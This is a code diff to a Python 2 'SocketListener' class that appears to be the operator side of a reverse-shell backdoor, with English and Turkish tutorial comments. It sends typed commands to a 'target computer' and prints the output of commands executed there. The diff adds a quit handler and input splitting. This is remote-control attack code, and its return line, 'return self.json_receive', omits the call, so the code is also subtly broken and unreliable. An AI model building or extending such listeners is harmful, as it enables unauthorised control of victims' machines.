@@ -25,13 +25,17 @@ class SocketListener:
                 
         
         def command_execution(self, command_input):
-            
+
              self.json_send(command_input)#Using the my_connection connection, we send the inputs entered by the user to the target computer.--My_connection bağlantısını kullanarak, kullanıcı tarafından girilen girişleri hedef bilgisayara göndeririz.
+             if command_input[0] == "quit":#By writing this "if" condition, we made the exit process to be quit with quit input.--Bu "eğer" koşulunu yazarak, çıkış işleminin çıkma girdisi ile çıkmasını sağladık.
+                 self.my_connection.close()
+                 exit()
              return self.json_receive #We retrieve the outputs of the commands executed on the target computer with the recv method.--Recv yöntemi ile hedef bilgisayarda çalıştırılan komutların çıktılarını alıyoruz.
     
         def start_listener(self):
             while True: 
                 command_input = raw_input("Enter the command: ")#We create a variable using the input method to receive commands from the user.--Kullanıcıdan komut almak için input yöntemini kullanarak bir değişken oluşturuyoruz.(raw_input for python2)
+                command_input = command_input.split(" ")#We make the codes received from the user into a list and make them workable.--Kullanıcıdan gelen kodları bir liste haline getirerek çalışır hale getiriyoruz.             
                 command_output = self.command_execution(command_input)
                 print(command_output)
             
